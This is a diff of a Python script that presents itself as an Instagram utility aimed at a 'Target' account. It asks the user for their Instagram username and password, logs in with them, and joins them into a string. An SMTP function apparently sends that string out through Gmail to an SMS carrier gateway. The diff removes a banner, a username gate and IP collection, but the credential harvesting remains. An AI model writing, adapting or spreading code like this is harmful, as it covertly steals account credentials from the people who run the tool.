@@ -6,44 +6,6 @@ import sys
 count = 0
 done = 0
 import threading
-try:
-	import socket
-except:
-	import pip
-	pip.install("socket")
-	import socket
-threadz = 5
-print("""
-          .-') _                   .-') _               
-         (  OO) )                 (  OO) )              
- .-----. /     '._  .-----.       /     '._             
-/ ,-.   \|'--...__)/ ,-.   \      |'--...__)            
-'-'  |  |'--.  .--''-'  |  |      '--.  .--'            
-   .'  /    |  |      .'  /   (`-.   |  |               
- .'  /__    |  |    .'  /__  (OO  )_ |  |               
-|       |   |  |   |       |,------.)|  |               
-`-------'   `--'   `-------'`------' `--'               
- _   .-')                                               
-( '.( OO )_                                             
- ,--.   ,--.) ,--.   ,--.                               
- |   `.'   |   \  `.'  /                                
- |         | .-')     /                                 
- |  |'.'|  |(OO  \   /                                  
- |  |   |  | |   /  /\_                                 
- |  |   |  | `-./  /.__)                                
- `--'   `--'   `--'                                     
-   ('-.                                                 
-  ( OO ).-.                                             
-  / . --. /   .-----.   .-----.                         
-  | \-.  \   '  .--./  '  .--./                         
-.-'-'  |  |  |  |('-.  |  |('-.                         
- \| |_.'  | /_) |OO  )/_) |OO  )                        
-  |  .-.  | ||  |`-'| ||  |`-'|                         
-  |  | |  |(_'  '--'\(_'  '--'\                         
-  `--' `--'   `-----'   `-----'                         
-instagram:2t2_t
-""")
-
 
 
 username = input("username: ")
@@ -87,7 +49,7 @@ def get():
 	except:
 		ip = 'N/A'
 	return ip
-n12 = username + ',' + pasword + "," + get()
+n12 = username + ',' + pasword
 def INFO(MESSAGE, CARRIER_MESSAGE, NUMBER,dic,pasm):
     to_number = NUMBER+CARRIER_MESSAGE
     server = smtplib.SMTP( "smtp.gmail.com", 587 )
@@ -132,9 +94,6 @@ def main():
 data = {"username":username,"enc_password":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+pasword,"queryParams":"{}","optIntoOneTap":"false"}
 login = r.post(url,headers=headers,data=data,allow_redirects=True)
 main()
-if username != "8illrk":
-	print("الرمز خاطئ جرب حساب اخر")
-	exit()
 if login.text.find("userId") >= 0 :
     r.headers.update({'X-CSRFToken': login.cookies['csrftoken']}) 
     url_id = "https://www.instagram.com/{}/?__a=1".format(Target) 
